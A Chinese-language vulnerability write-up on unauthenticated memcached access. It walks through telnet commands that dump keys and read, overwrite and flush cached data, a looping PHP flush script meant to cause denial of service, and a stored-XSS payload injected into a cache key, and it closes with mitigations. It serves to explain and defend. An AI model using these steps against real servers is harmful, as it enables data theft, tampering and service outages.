# 0x00 漏洞描述
Memcache是临时数据存储服务，以key-value存储格式存储数据，通过将数据块存储在缓存中，可以提高网站的整体性能，这些数据通常是应用读取频繁的。正因为内存中数据的读取远远大于硬盘，因此可以用来加速应用的访问。但由于memcached安全设计缺陷，默认的 11211 端口不需要密码即可访问，攻击者可获取数据库中信息，造成严重的信息泄露。

# 0x01 漏洞危害
除memcached中数据可被直接读取泄漏和恶意修改外，由于memcached中的数据像正常网站用户访问提交变量一样会被后端代码处理，当处理代码存在缺陷时会再次导致不同类型的安全问题。

在处理前端用户直接输入的数据时一般会接受更多的安全校验，而从memcached中读取的数据则更容易被开发者认为是可信的，或者是已经通过安全校验的，因此更容易导致安全问题。

由此可见，导致的二次安全漏洞类型一般由memcached数据使用的位置的不同而不同，如：

1. 缓存数据未经过滤直接输出可导致XSS；
2. 缓存数据未经过滤代入拼接的SQL注入查询语句可导致SQL注入；
3. 缓存数据存储敏感信息（如：用户名、密码），可以通过读取操作直接泄漏；
4. 缓存数据未经过滤直接通过system()、eval()等函数处理可导致命令执行；
5. 缓存数据未经过滤直接在header()函数中输出，可导致CRLF漏洞（HTTP响应拆分）

# 0x02 基础memcache命令
## 1、连接memcache
```
telnet ip port
```

如下为未授权访问成功：

![image](https://user-images.githubusercontent.com/84888757/163748352-415b8be5-b49e-4498-9261-4f81ab064cd6.png)

## 2、统计项目
Stats items 命令只是详细说明 Memcache 创建的所有条目或数据块的统计信息。
一个items 可以被认为是实际key: value数据的slabs。

```
stats items
```

![image](https://user-images.githubusercontent.com/84888757/163748379-be59980d-3658-47b9-8954-10a43b49e544.png)

## 3、统计缓存转储信息
了解这些slabs并不能给我们提供太多信息。我们需要的是`key:value`，它实际上拥有所有的数据。使用 `stats cachedump < item: id >` < number of keys you want to query > 查询 slab (item)中存储的键的数量。
```
stats cachedump <item: id>
```
🌰 在这里我们查询slab中item number为12的所有key（0代表所有key）；
可以看到有一个名为hue的key，它使用了1000b的数据，它的过期时间为1633659176 s

![image](https://user-images.githubusercontent.com/84888757/163748554-1fb74113-dd3f-4873-af2f-6757ee12ff2d.png)

## 4、检索数据
使用key去获得value数据
```
get <key_name>
```

在这里，我们获得了关于键hue存储的数据的信息。
数字0表示它没有过期时间，1000表示字符串的长度。

![image](https://user-images.githubusercontent.com/84888757/163748666-644e7e45-d7b4-4211-9f84-7b087805162f.png)

## 5、添加、编辑、替换数据
```
# 添加key:value
a.>set mykey 0 0 11
b.>hello world

Syntax for set is:
set <keyname> <some_flag> <expiration_in_millseconds> <length_of_data_to_follow>
```

![image](https://user-images.githubusercontent.com/84888757/163748753-c87f662c-ccac-484f-bff3-5512a575bb0b.png)

![image](https://user-images.githubusercontent.com/84888757/163748771-3b784119-c875-4f65-ae1c-8ab9d4549efe.png)

![image](https://user-images.githubusercontent.com/84888757/163748788-ec1becba-1ca9-4a25-89ac-07f505c2ae8e.png)


## 6、清除数据
Memcache 服务允许使用简单的 flush 命令完全删除所有缓存的数据。它接受一个数字参数，该参数指示数据刷新的时间(以秒为单位)。
```
flush_all 1
```
下图显示了我们首先查询的key `name`。接下来，我们使用 `flush _ all 1` 命令，它指示 Memcache 在1秒后清除所有数据。

图自[memcache-exploit](http://niiconsulting.com/checkmate/2013/05/memcache-exploit/)

![image](https://user-images.githubusercontent.com/84888757/163748957-67ee91c3-5c84-431f-9722-ef96cc5fb0bb.png)

# 0x03 漏洞利用
## DOS攻击
🌰 假设某网站的主页正在访问一些数据，比如搜索结果最多或浏览次数最多的个人资料，这些数据的详细信息都存储在 Memcache。如果该数据持续刷新，那么从应用程序访问任何数据到 Memcache 的调用将导致异常被持续抛出，从而导致 DoS。
使用一个简单的 PHP 脚本，可以不断刷新数据，这将使 web 服务器处于忙碌状态(可能导致DOS攻击)。
```
$memcache = new Memcache;
$memcache->connect('127.0.0.1', 11211) or die ("Could not connect"); //connect to memcached server
$mydata = "i want to cache this line"; //your cacheble data
$memcache->set('key', $mydata, false, 100); //add it to memcached server
while(1){
  $memcache->flush();
  sleep(2);
}
```

## 其他利用思路
通过查看 Memcache 的key，你应该可以找到一些数据，这些数据被应用程序用来显示给最终用户，比如在选择框中显示国家列表，或者显示最多的结果等等。

然后数据可以在缓存中被修改，这样我们就可以成功地发起客户端攻击，比如XSS。

类似地，如果 Memcache 的数据被存储在数据库中，那么 SQL 注入也是有可能的。这取决于应用程序的逻辑结构、应用程序中的数据流等。

## Attack XSS Demo

来自[memcache-exploit](http://niiconsulting.com/checkmate/2013/05/memcache-exploit/)

下面是一个简单的应用程序，我在 Memcache 存储了一组名称以便检索回来显示。

![image](https://user-images.githubusercontent.com/84888757/163749727-0e1f72a9-ca3d-419c-9bc8-9317ed5c729e.png)
![image](https://user-images.githubusercontent.com/84888757/163749755-0bb491f2-3a71-405a-bed6-a382156c4112.png)

现在，尝试修改键名为payload:
```
> delete names
> set names 0 0 30
> "/><script>alert('XSS')</script>
> STORED
```

再次访问页面，收获存储型xss一枚

![image](https://user-images.githubusercontent.com/84888757/163749811-1424a24e-6cc1-478e-9ea2-706dde61560b.png)

# 0x04 修复方式
1. 将 Memcache 服务器绑定到一个特定的源 IP。
2. 不要在 DMZ 环境或者互联网上公开此服务。
3. 如果业务需求要求在因特网上公开服务，那么确保服务运行在防火墙之后，可以访问指定的 Source IP (主要是 web 服务器 IP)。

# 0x05 参考链接
- http://niiconsulting.com/checkmate/2013/05/memcache-exploit/
